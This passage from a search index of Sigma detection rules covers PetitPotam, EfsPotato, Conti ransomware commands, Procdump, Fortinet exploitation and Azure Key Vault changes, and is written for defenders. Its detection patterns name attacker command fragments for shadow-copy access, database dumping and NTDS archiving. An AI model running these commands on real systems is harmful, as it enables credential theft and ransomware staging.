refereed to as PetitPotam. The usage of this RPC function should be rare if ever used at all. Thus usage of this function is uncommon enough that any usage of this RPC function should warrant further investigation to determine if it is legitimate. View surrounding logs (within a few minutes before and after) from the Source IP to. Logs from from the Source IP would include dce_rpc, smb_mapping, smb_files, rdp, ntlm, kerberos, etc..'\nKnown false-positives Uncommon but legitimate windows administrator or software tasks that make use of the Encrypting File System RPC Calls. Verify if this is common activity (see description). References https://github.com/topotam/PetitPotam/blob/main/PetitPotam/PetitPotam.cpp https://msrc.microsoft.com/update-guide/vulnerability/ADV210003 https://vx-underground.org/archive/Symantec/windows-vista-network-attack-07-en.pdf https://threatpost.com/microsoft-petitpotam-poc/168163/ Raw rule (edit) title: Potential PetitPotam Attack Via EFS RPC Calls id: 4096842a-8f9f-4d36-92b4-d0b2a62f9b2a description: | Detects usage of the windows RPC library Encrypting File System Remote Protocol (MS-EFSRPC). Variations of this RPC are used within the attack refereed to as PetitPotam. The usage of this RPC function should be rare if ever used at all. Thus usage of this function is uncommon enough that any usage of this RPC function should warrant further investigation to determine if it is legitimate. View surrounding logs (within a few minutes before and after) from the Source IP to. Logs from from the Source IP would include dce_rpc, smb_mapping, smb_files, rdp, ntlm, kerberos, etc..\u0026#39; status: experimental author: \u0026#39;@neu5ron, @Antonlovesdnb, Mike Remen\u0026#39; date: 2021/08/17 references: - https://github.com/topotam/PetitPotam/blob/main/PetitPotam/PetitPotam.cpp - https://msrc.microsoft.com/update-guide/vulnerability/ADV210003 - https://vx-underground.org/archive/Symantec/windows-vista-network-attack-07-en.pdf - https://threatpost.com/microsoft-petitpotam-poc/168163/ tags: - attack.t1557.001 - attack.t1187 logsource: product: zeek service: dce_rpc detection: efs_operation: operation|startswith: - \u0026#39;Efs\u0026#39; - \u0026#39;efs\u0026#39; condition: efs_operation falsepositives: - Uncommon but legitimate windows administrator or software tasks that make use of the Encrypting File System RPC Calls. Verify if this is common activity (see description). level: medium fields: - id.orig_h - id.resp_h - id.resp_p - operation - endpoint - named_pipe - uid ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/network/zeek/zeek_dce_rpc_potential_petit_potam_efs_rpc_call.yml/","tags":["attack.t1557.001","attack.t1187"],"title":"Potential PetitPotam Attack Via EFS RPC Calls"},{"categories":null,"contents":"Adversaries may attempt to gather information about attached peripheral devices and components connected to a computer system.\nKnown false-positives admin script References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1120/T1120.md Raw rule (edit) title: Powershell Suspicious Win32_PnPEntity id: b26647de-4feb-4283-af6b-6117661283c5 status: experimental author: frack113 date: 2021/08/23 modified: 2021/10/16 description: Adversaries may attempt to gather information about attached peripheral devices and components connected to a computer system. references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1120/T1120.md tags: - attack.discovery - attack.t1120 logsource: product: windows category: ps_script definition: EnableScriptBlockLogging must be set to enable detection: selection: ScriptBlockText|contains: Win32_PnPEntity condition: selection falsepositives: - admin script level: low ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_suspicious_win32_pnpentity.yml/","tags":["attack.discovery","attack.t1120"],"title":"Powershell Suspicious Win32_PnPEntity"},{"categories":null,"contents":"Detects a write of an Exchange CSR to an untypical directory or with aspx name suffix which can be used to place a webshell\nKnown false-positives unlikely References https://twitter.com/GossiTheDog/status/1429175908905127938 Raw rule (edit) title: Certificate Request Export to Exchange Webserver id: b7bc7038-638b-4ffd-880c-292c692209ef status: experimental description: Detects a write of an Exchange CSR to an untypical directory or with aspx name suffix which can be used to place a webshell references: - https://twitter.com/GossiTheDog/status/1429175908905127938 author: Max Altgelt date: 2021/08/23 logsource: service: msexchange-management product: windows detection: export_command: - \u0026#39;New-ExchangeCertificate\u0026#39; - \u0026#39; -GenerateRequest\u0026#39; - \u0026#39; -BinaryEncoded\u0026#39; - \u0026#39; -RequestFile\u0026#39; export_params: - \u0026#39;\\\\\\\\localhost\\\\C$\u0026#39; - \u0026#39;\\\\\\\\127.0.0.1\\\\C$\u0026#39; - \u0026#39;C:\\\\inetpub\u0026#39; - \u0026#39;.aspx\u0026#39; condition: all of export_command and export_params falsepositives: - unlikely level: critical tags: - attack.persistence - attack.t1505.003 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/msexchange/win_exchange_proxyshell_certificate_generation.yml/","tags":["attack.persistence","attack.t1505.003"],"title":"Certificate Request Export to Exchange Webserver"},{"categories":null,"contents":"Detects suspicious Splwow64.exe process without any command line parameters\nKnown false-positives Unknown References https://twitter.com/sbousseaden/status/1429401053229891590?s=12 Raw rule (edit) title: Suspicious Splwow64 Without Params id: 1f1a8509-2cbb-44f5-8751-8e1571518ce2 status: experimental description: Detects suspicious Splwow64.exe process without any command line parameters references: - https://twitter.com/sbousseaden/status/1429401053229891590?s=12 author: Florian Roth date: 2021/08/23 modified: 2021/11/29 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\splwow64.exe\u0026#39; CommandLine|endswith: \u0026#39;splwow64.exe\u0026#39; condition: selection falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1202 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_splwow64.yml/","tags":["attack.defense_evasion","attack.t1202"],"title":"Suspicious Splwow64 Without Params"},{"categories":null,"contents":"Detects the pattern of a pipe name as used by the tool EfsPotato\nKnown false-positives Unknown References https://twitter.com/SBousseaden/status/1429530155291193354?s=20 https://github.com/zcgonvh/EfsPotato Raw rule (edit) title: EfsPotato Named Pipe id: 637f689e-b4a5-4a86-be0e-0100a0a33ba2 status: experimental description: Detects the pattern of a pipe name as used by the tool EfsPotato references: - https://twitter.com/SBousseaden/status/1429530155291193354?s=20 - https://github.com/zcgonvh/EfsPotato date: 2021/08/23 author: Florian Roth logsource: product: windows category: pipe_created definition: \u0026#39;Note that you have to configure logging for Named Pipe Events in Sysmon config (Event ID 17 and Event ID 18). The basic configuration is in popular sysmon configuration (https://github.com/SwiftOnSecurity/sysmon-config), but it is worth verifying. You can also use other repo, e.g. https://github.com/Neo23x0/sysmon-config, https://github.com/olafhartong/sysmon-modular. How to test detection? You can check powershell script from this site https://svch0st.medium.com/guide-to-named-pipes-and-hunting-for-cobalt-strike-pipes-dc46b2c5f575\u0026#39; detection: selection: PipeName|contains: - \u0026#39;\\pipe\\\u0026#39; - \u0026#39;\\pipe\\srvsvc\u0026#39; # more specific version (use only this one of the other causes too many false positives) condition: selection tags: - attack.defense_evasion - attack.privilege_escalation - attack.t1055 falsepositives: - Unknown level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/pipe_created/pipe_created_efspotato_namedpipe.yml/","tags":["attack.defense_evasion","attack.privilege_escalation","attack.t1055"],"title":"EfsPotato Named Pipe"},{"categories":null,"contents":"Powerup tool\u0026rsquo;s Write Hijack DLL exploits DLL hijacking for privilege escalation. In it\u0026rsquo;s default mode, it builds a self deleting .bat file which executes malicious command. The detection rule relies on creation of the malicious bat file (debug.bat by default).\nKnown false-positives Pentest Any powershell script that creates bat files References https://powersploit.readthedocs.io/en/latest/Privesc/Write-HijackDll/ Raw rule (edit) title: Powerup Write Hijack DLL id: 602a1f13-c640-4d73-b053-be9a2fa58b96 status: experimental description: Powerup tool\u0026#39;s Write Hijack DLL exploits DLL hijacking for privilege escalation. In it\u0026#39;s default mode, it builds a self deleting .bat file which executes malicious command. The detection rule relies on creation of the malicious bat file (debug.bat by default). references: - https://powersploit.readthedocs.io/en/latest/Privesc/Write-HijackDll/ author: Subhash Popuri (@pbssubhash) date: 2021/08/21 tags: - attack.persistence - attack.privilege_escalation - attack.defense_evasion - attack.t1574.001 logsource: category: file_event product: windows detection: selection: Image|endswith: \u0026#39;\\powershell.exe\u0026#39; TargetFilename|endswith: \u0026#39;.bat\u0026#39; condition: selection falsepositives: - Pentest - Any powershell script that creates bat files # highly unlikely (untested) level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/file_event/file_event_win_detect_powerup_dllhijacking.yml/","tags":["attack.persistence","attack.privilege_escalation","attack.defense_evasion","attack.t1574.001"],"title":"Powerup Write Hijack DLL"},{"categories":null,"contents":"Detects transferring files from system on a server bitstransfer Powershell cmdlets\nKnown false-positives Unknown References https://docs.microsoft.com/en-us/powershell/module/bitstransfer/add-bitsfile?view=windowsserver2019-ps Raw rule (edit) title: Suspicious Bitstransfer via PowerShell id: cd5c8085-4070-4e22-908d-a5b3342deb74 status: experimental description: Detects transferring files from system on a server bitstransfer Powershell cmdlets references: - https://docs.microsoft.com/en-us/powershell/module/bitstransfer/add-bitsfile?view=windowsserver2019-ps tags: - attack.exfiltration - attack.persistence - attack.t1197 date: 2021/08/19 author: Austin Songer @austinsonger logsource: category: process_creation product: windows detection: selection: Image|endswith: - \u0026#39;\\powershell.exe\u0026#39; - \u0026#39;\\powershell_ise.exe\u0026#39; - \u0026#39;\\pwsh.exe\u0026#39; CommandLine|contains: - \u0026#39;Get-BitsTransfer\u0026#39; - \u0026#39;Add-BitsFile\u0026#39; condition: selection fields: - ComputerName - User - CommandLine falsepositives: - Unknown level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_bitstransfer.yml/","tags":["attack.exfiltration","attack.persistence","attack.t1197"],"title":"Suspicious Bitstransfer via PowerShell"},{"categories":null,"contents":"Adversaries may establish persistence by executing malicious content triggered by user inactivity. Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension\nKnown false-positives GPO References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.002/T1546.002.md https://www.welivesecurity.com/wp-content/uploads/2017/08/eset-gazer.pdf Raw rule (edit) title: Suspicious ScreenSave Change by Reg.exe id: 0fc35fc3-efe6-4898-8a37-0b233339524f status: experimental author: frack113 date: 2021/08/19 description: | Adversaries may establish persistence by executing malicious content triggered by user inactivity. Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.002/T1546.002.md - https://www.welivesecurity.com/wp-content/uploads/2017/08/eset-gazer.pdf tags: - attack.privilege_escalation - attack.t1546.002 logsource: category: process_creation product: windows detection: selection_reg: Image|endswith: reg.exe CommandLine|contains: - \u0026#39;HKEY_CURRENT_USER\\Control Panel\\Desktop\u0026#39; - \u0026#39;HKCU\\Control Panel\\Desktop\u0026#39; selection_option_1: # /force Active ScreenSaveActive CommandLine|contains|all: - \u0026#39;/v ScreenSaveActive\u0026#39; - \u0026#39;/t REG_SZ\u0026#39; - \u0026#39;/d 1\u0026#39; - \u0026#39;/f\u0026#39; selection_option_2: # /force set ScreenSaveTimeout CommandLine|contains|all: - \u0026#39;/v ScreenSaveTimeout\u0026#39; - \u0026#39;/t REG_SZ\u0026#39; - \u0026#39;/d \u0026#39; - \u0026#39;/f\u0026#39; selection_option_3: # /force set ScreenSaverIsSecure CommandLine|contains|all: - \u0026#39;/v ScreenSaverIsSecure\u0026#39; - \u0026#39;/t REG_SZ\u0026#39; - \u0026#39;/d 0\u0026#39; - \u0026#39;/f\u0026#39; selection_option_4: # /force set a .scr CommandLine|contains|all: - \u0026#39;/v SCRNSAVE.EXE\u0026#39; - \u0026#39;/t REG_SZ\u0026#39; - \u0026#39;/d \u0026#39; - \u0026#39;.scr\u0026#39; - \u0026#39;/f\u0026#39; condition: selection_reg and 1 of selection_option_* falsepositives: - GPO level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_screensaver_reg.yml/","tags":["attack.privilege_escalation","attack.t1546.002"],"title":"Suspicious ScreenSave Change by Reg.exe"},{"categories":null,"contents":"Adversaries may gain persistence and elevate privileges by executing malicious content triggered by PowerShell profiles.\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.013/T1546.013.md Raw rule (edit) title: Powershell Trigger Profiles by Add_Content id: 05b3e303-faf0-4f4a-9b30-46cc13e69152 status: experimental author: frack113 date: 2021/08/18 modified: 2021/10/16 description: Adversaries may gain persistence and elevate privileges by executing malicious content triggered by PowerShell profiles. references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.013/T1546.013.md tags: - attack.privilege_escalation - attack.t1546.013 logsource: product: windows category: ps_script definition: EnableScriptBlockLogging must be set to enable detection: selection: ScriptBlockText|contains|all: - \u0026#39;Add-Content\u0026#39; - \u0026#39;$profile\u0026#39; - \u0026#39;-Value\u0026#39; ScriptBlockText|contains: - \u0026#39;Start-Process\u0026#39; - \u0026#39;\u0026#34;\u0026#34;\u0026#39; #cleanup action condition: selection falsepositives: - Unknown level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_trigger_profiles.yml/","tags":["attack.privilege_escalation","attack.t1546.013"],"title":"Powershell Trigger Profiles by Add_Content"},{"categories":null,"contents":"Detects CVE-2021-22123 exploitation attempt against Fortinet WAFs\nKnown false-positives Unknown References https://www.rapid7.com/blog/post/2021/08/17/fortinet-fortiweb-os-command-injection Raw rule (edit) title: Fortinet CVE-2021-22123 Exploitation description: Detects CVE-2021-22123 exploitation attempt against Fortinet WAFs id: f425637f-891c-4191-a6c4-3bb1b70513b4 status: experimental references: - https://www.rapid7.com/blog/post/2021/08/17/fortinet-fortiweb-os-command-injection author: Bhabesh Raj, Florian Roth date: 2021/08/19 modified: 2021/11/23 tags: - attack.initial_access - attack.t1190 logsource: category: webserver detection: selection: c-uri|contains: \u0026#39;/api/v2.0/user/remoteserver.saml\u0026#39; cs-method: POST filter1: cs-referer|contains: \u0026#39;/root/user/remote-user/saml-user/\u0026#39; filter2: cs-referer: null condition: selection and not filter1 and not filter2 fields: - c-ip - url - response falsepositives: - Unknown level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/web/web_fortinet_cve_2021_22123_exploit.yml/","tags":["attack.initial_access","attack.t1190"],"title":"Fortinet CVE-2021-22123 Exploitation"},{"categories":null,"contents":"Identifies when a suppression rule is created in Azure. Adversary\u0026rsquo;s could attempt this to evade detection.\nKnown false-positives Suppression Rule being created may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. Suppression Rule created from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. References https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations Raw rule (edit) title: Azure Suppression Rule Created id: 92cc3e5d-eb57-419d-8c16-5c63f325a401 description: Identifies when a suppression rule is created in Azure. Adversary\u0026#39;s could attempt this to evade detection. author: Austin Songer status: experimental date: 2021/08/16 references: - https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations logsource: product: azure service: azure.activitylogs detection: selection: properties.message: - MICROSOFT.SECURITY/ALERTSSUPPRESSIONRULES/WRITE condition: selection level: medium tags: - attack.impact falsepositives: - Suppression Rule being created may be performed by a system administrator. - Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - Suppression Rule created from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/azure/azure_suppression_rule_created.yml/","tags":["attack.impact"],"title":"Azure Suppression Rule Created"},{"categories":null,"contents":"Identifies when secrets are modified or deleted in Azure.\nKnown false-positives Secrets being modified or deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. Secrets modified or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. References https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations Raw rule (edit) title: Azure Keyvault Secrets Modified or Deleted id: b831353c-1971-477b-abb6-2828edc3bca1 description: Identifies when secrets are modified or deleted in Azure. author: Austin Songer @austinsonger status: experimental date: 2021/08/16 references: - https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations logsource: product: azure service: azure.activitylogs detection: selection: properties.message: - MICROSOFT.KEYVAULT/VAULTS/SECRETS/WRITE - MICROSOFT.KEYVAULT/VAULTS/SECRETS/DELETE - MICROSOFT.KEYVAULT/VAULTS/SECRETS/BACKUP/ACTION - MICROSOFT.KEYVAULT/VAULTS/SECRETS/PURGE/ACTION - MICROSOFT.KEYVAULT/VAULTS/SECRETS/UPDATE/ACTION - MICROSOFT.KEYVAULT/VAULTS/SECRETS/RECOVER/ACTION - MICROSOFT.KEYVAULT/VAULTS/SECRETS/RESTORE/ACTION - MICROSOFT.KEYVAULT/VAULTS/SECRETS/SETSECRET/ACTION condition: selection level: medium tags: - attack.impact - attack.credential_access - attack.t1552 - attack.t1552.001 falsepositives: - Secrets being modified or deleted may be performed by a system administrator. - Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - Secrets modified or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/azure/azure_keyvault_secrets_modified_or_deleted.yml/","tags":["attack.impact","attack.credential_access","attack.t1552","attack.t1552.001"],"title":"Azure Keyvault Secrets Modified or Deleted"},{"categories":null,"contents":"Identifies when a Keyvault Key is modified or deleted in Azure.\nKnown false-positives Key being modified or deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. Key modified or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. References https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations Raw rule (edit) title: Azure Keyvault Key Modified or Deleted id: 80eeab92-0979-4152-942d-96749e11df40 description: Identifies when a Keyvault Key is modified or deleted in Azure. author: Austin Songer @austinsonger status: experimental date: 2021/08/16 references: - https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations logsource: product: azure service: azure.activitylogs detection: selection: properties.message: - MICROSOFT.KEYVAULT/VAULTS/KEYS/UPDATE/ACTION - MICROSOFT.KEYVAULT/VAULTS/KEYS/CREATE - MICROSOFT.KEYVAULT/VAULTS/KEYS/CREATE/ACTION - MICROSOFT.KEYVAULT/VAULTS/KEYS/IMPORT/ACTION - MICROSOFT.KEYVAULT/VAULTS/KEYS/RECOVER/ACTION - MICROSOFT.KEYVAULT/VAULTS/KEYS/RESTORE/ACTION - MICROSOFT.KEYVAULT/VAULTS/KEYS/DELETE - MICROSOFT.KEYVAULT/VAULTS/KEYS/BACKUP/ACTION - MICROSOFT.KEYVAULT/VAULTS/KEYS/PURGE/ACTION condition: selection level: medium tags: - attack.impact - attack.credential_access - attack.t1552 - attack.t1552.001 falsepositives: - Key being modified or deleted may be performed by a system administrator. - Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - Key modified or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/azure/azure_keyvault_key_modified_or_deleted.yml/","tags":["attack.impact","attack.credential_access","attack.t1552","attack.t1552.001"],"title":"Azure Keyvault Key Modified or Deleted"},{"categories":null,"contents":"Identifies when a key vault is modified or deleted.\nKnown false-positives Key Vault being modified or deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. Key Vault modified or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. References https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations Raw rule (edit) title: Azure Key Vault Modified or Deleted. id: 459a2970-bb84-4e6a-a32e-ff0fbd99448d description: Identifies when a key vault is modified or deleted. author: Austin Songer @austinsonger status: experimental date: 2021/08/16 references: - https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations logsource: product: azure service: azure.activitylogs detection: selection: properties.message: - MICROSOFT.KEYVAULT/VAULTS/WRITE - MICROSOFT.KEYVAULT/VAULTS/DELETE - MICROSOFT.KEYVAULT/VAULTS/DEPLOY/ACTION - MICROSOFT.KEYVAULT/VAULTS/ACCESSPOLICIES/WRITE condition: selection level: medium tags: - attack.impact - attack.credential_access - attack.t1552 - attack.t1552.001 falsepositives: - Key Vault being modified or deleted may be performed by a system administrator. - Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - Key Vault modified or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/azure/azure_keyvault_modified_or_deleted.yml/","tags":["attack.impact","attack.credential_access","attack.t1552","attack.t1552.001"],"title":"Azure Key Vault Modified or Deleted."},{"categories":null,"contents":"Identifies when a application security group is modified or deleted.\nKnown false-positives Application security group being modified or deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. Application security group modified or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. References https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations Raw rule (edit) title: Azure Application Security Group Modified or Deleted id: 835747f1-9329-40b5-9cc3-97d465754ce6 description: Identifies when a application security group is modified or deleted. author: Austin Songer status: experimental date: 2021/08/16 references: - https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations logsource: product: azure service: azure.activitylogs detection: selection: properties.message: - MICROSOFT.NETWORK/APPLICATIONSECURITYGROUPS/WRITE - MICROSOFT.NETWORK/APPLICATIONSECURITYGROUPS/DELETE condition: selection level: medium tags: - attack.impact falsepositives: - Application security group being modified or deleted may be performed by a system administrator. - Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - Application security group modified or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/azure/azure_application_security_group_modified_or_deleted.yml/","tags":["attack.impact"],"title":"Azure Application Security Group Modified or Deleted"},{"categories":null,"contents":"Identifies when a application gateway is modified or deleted.\nKnown false-positives Application gateway being modified or deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. Application gateway modified or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. References https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations Raw rule (edit) title: Azure Application Gateway Modified or Deleted id: ad87d14e-7599-4633-ba81-aeb60cfe8cd6 description: Identifies when a application gateway is modified or deleted. author: Austin Songer status: experimental date: 2021/08/16 references: - https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations logsource: product: azure service: azure.activitylogs detection: selection: properties.message: - MICROSOFT.NETWORK/APPLICATIONGATEWAYS/WRITE - MICROSOFT.NETWORK/APPLICATIONGATEWAYS/DELETE condition: selection level: medium tags: - attack.impact falsepositives: - Application gateway being modified or deleted may be performed by a system administrator. - Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - Application gateway modified or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/azure/azure_application_gateway_modified_or_deleted.yml/","tags":["attack.impact"],"title":"Azure Application Gateway Modified or Deleted"},{"categories":null,"contents":"Identifies when an EKS cluster is created or deleted.\nKnown false-positives EKS Cluster being created or deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. EKS Cluster created or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. References https://any-api.com/amazonaws_com/eks/docs/API_Description Raw rule (edit) title: AWS EKS Cluster Created or Deleted id: 33d50d03-20ec-4b74-a74e-1e65a38af1c0 description: Identifies when an EKS cluster is created or deleted. author: Austin Songer status: experimental date: 2021/08/16 references: - https://any-api.com/amazonaws_com/eks/docs/API_Description logsource: product: aws service: cloudtrail detection: selection: eventSource: eks.amazonaws.com eventName: - CreateCluster - DeleteCluster condition: selection level: low tags: - attack.impact - attack.t1485 falsepositives: - EKS Cluster being created or deleted may be performed by a system administrator. - Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - EKS Cluster created or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/aws/aws_eks_cluster_created_or_deleted.yml/","tags":["attack.impact","attack.t1485"],"title":"AWS EKS Cluster Created or Deleted"},{"categories":null,"contents":"Detects uses of the SysInternals Procdump utility\nKnown false-positives Legitimate use of procdump by a developer or administrator References Internal Research Raw rule (edit) title: Procdump Usage id: 2e65275c-8288-4ab4-aeb7-6274f58b6b20 description: Detects uses of the SysInternals Procdump utility status: experimental references: - Internal Research author: Florian Roth date: 2021/08/16 tags: - attack.defense_evasion - attack.t1036 - attack.t1003.001 logsource: category: process_creation product: windows detection: selection1: Image|endswith: - \u0026#39;\\procdump.exe\u0026#39; - \u0026#39;\\procdump64.exe\u0026#39; selection2: CommandLine|contains|all: - \u0026#39; -ma \u0026#39; - \u0026#39;.exe\u0026#39; condition: selection1 or selection2 falsepositives: - Legitimate use of procdump by a developer or administrator level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_procdump.yml/","tags":["attack.defense_evasion","attack.t1036","attack.t1003.001"],"title":"Procdump Usage"},{"categories":null,"contents":"Detects a command used by conti to dump database\nKnown false-positives Unknown References https://twitter.com/vxunderground/status/1423336151860002816?s=20 https://www.virustotal.com/gui/file/03e9b8c2e86d6db450e5eceec057d7e369ee2389b9daecaf06331a95410aa5f8/detection https://docs.microsoft.com/en-us/sql/tools/sqlcmd-utility?view=sql-server-ver15 Raw rule (edit) title: Conti Backup Database id: 2f47f1fd-0901-466e-a770-3b7092834a1b status: experimental author: frack113 date: 2021/08/16 modified: 2021/12/02 description: Detects a command used by conti to dump database references: - https://twitter.com/vxunderground/status/1423336151860002816?s=20 #the leak info not the files itself - https://www.virustotal.com/gui/file/03e9b8c2e86d6db450e5eceec057d7e369ee2389b9daecaf06331a95410aa5f8/detection - https://docs.microsoft.com/en-us/sql/tools/sqlcmd-utility?view=sql-server-ver15 tags: - attack.collection - attack.t1005 logsource: category: process_creation product: windows detection: selection_tools: CommandLine|contains: - \u0026#39;sqlcmd \u0026#39; - \u0026#39;sqlcmd.exe\u0026#39; selection_svr: CommandLine|contains: \u0026#39; -S localhost \u0026#39; selection_query: CommandLine|contains: - \u0026#39;sys.sysprocesses\u0026#39; - \u0026#39;master.dbo.sysdatabases\u0026#39; - \u0026#39;BACKUP DATABASE\u0026#39; condition: all of selection* falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_coti_sqlcmd.yml/","tags":["attack.collection","attack.t1005"],"title":"Conti Backup Database"},{"categories":null,"contents":"Detects a command used by conti to find volume shadow backups\nKnown false-positives Unknown References https://twitter.com/vxunderground/status/1423336151860002816?s=20 https://www.virustotal.com/gui/file/03e9b8c2e86d6db450e5eceec057d7e369ee2389b9daecaf06331a95410aa5f8/detection Raw rule (edit) title: Conti Volume Shadow Listing id: 7b30e0a7-c675-4b24-8a46-82fa67e2433d description: Detects a command used by conti to find volume shadow backups author: Max Altgelt, Tobias Michalski date: 2021/08/09 status: experimental references: - https://twitter.com/vxunderground/status/1423336151860002816?s=20 - https://www.virustotal.com/gui/file/03e9b8c2e86d6db450e5eceec057d7e369ee2389b9daecaf06331a95410aa5f8/detection logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - \u0026#39;vssadmin list shadows\u0026#39; - \u0026#39;log.txt\u0026#39; condition: selection fields: - User - CommandLine - ParentImage falsepositives: - Unknown level: high tags: - attack.t1587.001 - attack.resource_development ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_malware_conti.yml/","tags":["attack.t1587.001","attack.resource_development"],"title":"Conti Volume Shadow Listing"},{"categories":null,"contents":"Detects a command used by conti to exfiltrate NTDS\nKnown false-positives Unknown References https://twitter.com/vxunderground/status/1423336151860002816?s=20 https://www.virustotal.com/gui/file/03e9b8c2e86d6db450e5eceec057d7e369ee2389b9daecaf06331a95410aa5f8/detection Raw rule (edit) title: Conti Volume Shadow Listing id: aa92fd02-09f2-48b0-8a93-864813fb8f41 description: Detects a command used by conti to exfiltrate NTDS author: Max Altgelt, Tobias Michalski date: 2021/08/09 status: experimental references: - https://twitter.com/vxunderground/status/1423336151860002816?s=20 - https://www.virustotal.com/gui/file/03e9b8c2e86d6db450e5eceec057d7e369ee2389b9daecaf06331a95410aa5f8/detection logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - \u0026#39;7za.exe\u0026#39; - \u0026#39;\\\\C$\\\\temp\\\\log.zip\u0026#39; condition: selection falsepositives: - Unknown level: high tags: - attack.collection - attack.t1560 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_malware_conti_7zip.yml/","tags":["attack.collection","attack.t1560"],"title":"Conti Volume Shadow Listing"},{"categories":null,"contents":"Detects a command used by conti to access volume shadow backups\nKnown false-positives Some rare backup scenarios References https://twitter.com/vxunderground/status/1423336151860002816?s=20 https://www.virustotal.com/gui/file/03e9b8c2e86d6db450e5eceec057d7e369ee2389b9daecaf06331a95410aa5f8/detection Raw rule (edit) title: Conti Volume Shadow Listing id: f57f8d16-1f39-4dcb-a604-6c73d9b54b3d description: Detects a command used by conti to access volume shadow backups author: Max Altgelt, Tobias Michalski date: 2021/08/09 modified: 2021/12/02 status: experimental references: - https://twitter.com/vxunderground/status/1423336151860002816?s=20 - https://www.virustotal.com/gui/file/03e9b8c2e86d6db450e5eceec057d7e369ee2389b9daecaf06331a95410aa5f8/detection logsource: category: process_creation product: windows detection: selection_1: CommandLine|contains: \u0026#39;\\\\\\\\\\?\\\\GLOBALROOT\\\\Device\\\\HarddiskVolumeShadowCopy\u0026#39; selection_2: CommandLine|contains: - 